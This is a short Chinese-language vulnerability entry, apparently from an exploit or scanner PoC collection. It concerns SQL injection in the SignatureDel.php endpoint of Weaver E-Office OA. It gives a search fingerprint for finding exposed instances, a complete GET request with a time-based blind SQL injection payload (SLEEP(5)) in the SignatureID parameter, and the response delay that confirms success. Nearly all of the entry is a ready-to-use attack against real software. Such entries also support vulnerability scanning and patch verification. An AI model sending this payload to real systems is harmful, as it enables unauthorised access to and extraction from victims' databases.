# 泛微E-OfficeSignatureDel.php存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`header="general/login/index.php"`
- **请求**：`GET /iWebOffice/Signature/SignatureDel.php?SignatureID=1+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))x) HTTP/1.1`
- **响应特征**：200 响应时间>=5s